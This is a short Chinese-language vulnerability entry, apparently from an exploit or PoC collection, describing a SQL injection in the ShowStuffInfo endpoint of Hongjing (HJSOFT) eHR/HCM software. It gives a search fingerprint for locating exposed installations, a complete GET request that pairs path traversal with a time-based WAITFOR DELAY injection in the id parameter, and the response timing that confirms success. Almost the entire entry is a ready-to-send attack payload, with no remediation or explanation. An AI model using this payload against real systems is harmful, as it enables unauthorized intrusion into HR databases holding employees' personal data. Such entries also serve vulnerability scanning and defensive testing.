# 宏景eHRShowStuffInfo存在SQL注入漏洞

宏景 ｜ SQL注入 ｜ —
- **指纹**：`app="HJSOFT-HCM"`
- **请求**：`GET /templates/attestation/../../jp_contest/personinfo/ShowStuffInfo?id=1';WAITFOR+DELAY+'0:0:5'--+ HTTP/1.1`
- **响应特征**：200 响应时间≥5s